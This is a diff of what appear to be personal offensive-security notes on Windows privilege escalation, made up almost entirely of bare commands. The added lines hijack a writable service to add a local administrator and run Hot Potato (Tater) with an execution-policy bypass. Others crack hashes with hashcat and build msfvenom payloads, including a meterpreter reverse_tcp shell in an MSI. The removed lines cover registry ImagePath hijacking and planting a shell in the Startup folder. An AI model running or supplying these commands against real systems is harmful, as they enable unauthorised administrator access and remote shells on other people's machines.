@@ -9,22 +9,23 @@ reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 msiexec /quiet /qn /i <msi location>
 Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)
 reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f  
+sc config regsvc binpath="net localgroup administrators <username> /add"
 sc start regsvc
-icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"  
+
+HOT POTATO  
+powershell.exe -nop -ep bypass  
+Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1  
+Invoke-Tater -Trigger 1 -Command "net localgroup administrators <username> /add"  
+net localgroup administrators  
+
+
 
 -hashcat -m 1000 <hash> <wordlist>
 
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi -o <filename>.msi
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi -o <filename>.msi  
+msfvenom -p windows/exec CMD='net localgroup aministrators <username> /add' -f exe-service -o <filename>.exe  
  
 x86_64-w64-mingw32-gcc <filename>.c -o <filename>.exe
  
- #### Service Escalation through the registry
-Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)  
-Download useradd.c to kali then compile - [https://github.com/codingo/OSCP-2/blob/master/Windows/useradd.c](https://github.com/codingo/OSCP-2/blob/master/Windows/useradd.c)  
-x86_64-w64-mingw32-gcc useradd.c -o mycode.exe  
-reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\mycode.exe /f  
-sc start regsvc
-
-#### Startup Applications
-icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" ~ (BUILTIN\Users '(F)' means user has full access)
-Place shell or code in this folder, when user logs in, code execution
+Basic XXE
